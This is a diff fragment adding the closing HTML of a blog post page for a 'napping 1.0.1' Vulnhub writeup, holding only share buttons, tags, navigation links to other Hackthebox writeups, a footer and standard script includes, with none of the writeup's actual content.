+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-06-27-napping/" data-title="napping 1.0.1 vulnhub writeup" data-via="tinkerhell1337" data-hashtags="Vulnhub,tab-nabbing,phishing,vim"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-06-27-napping/" data-hashtag="Vulnhub"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-06-27-napping/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-06-27-napping%2f&amp;text=napping%201.0.1%20vulnhub%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/vulnhub/">Vulnhub</a>,&nbsp;<a href="/tags/tab-nabbing/">Tab-Nabbing</a>,&nbsp;<a href="/tags/phishing/">Phishing</a>,&nbsp;<a href="/tags/vim/">Vim</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-machines/2022-05-21-pandora/" class="prev" rel="prev" title="Pandora Hackthebox writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pandora Hackthebox writeup</a>
+            <a href="/posts/android-pentesting/2022-07-09-routerspace/" class="next" rel="next" title="Routerspace Hackthebox writeup">Routerspace Hackthebox writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
